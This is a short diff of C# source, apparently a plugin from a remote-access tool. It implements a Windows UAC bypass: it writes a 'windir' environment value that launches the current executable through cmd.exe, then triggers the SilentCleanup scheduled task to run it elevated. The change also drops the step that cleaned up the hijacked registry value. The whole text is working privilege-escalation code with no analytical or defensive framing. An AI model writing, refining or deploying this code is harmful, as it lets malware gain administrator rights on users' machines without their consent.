@@ -51,18 +51,14 @@ namespace Plugin.Handler
                 Microsoft.Win32.RegistryKey key;
                 key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Environment");
                 key.SetValue("windir", @"cmd.exe " + @"/k START " + Process.GetCurrentProcess().MainModule.FileName + " & EXIT");
-
-                Thread.Sleep(500);
+                key.Close();
 
                 Process process = new Process();
                 process.StartInfo.FileName = "schtasks.exe";
                 process.StartInfo.Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
                 process.Start();
-
-                Thread.Sleep(500);
-
-                key.DeleteValue("windir");
-                key.Close();
+                
+                Methods.ClientExit();
                 Environment.Exit(0);
             }
             catch{}
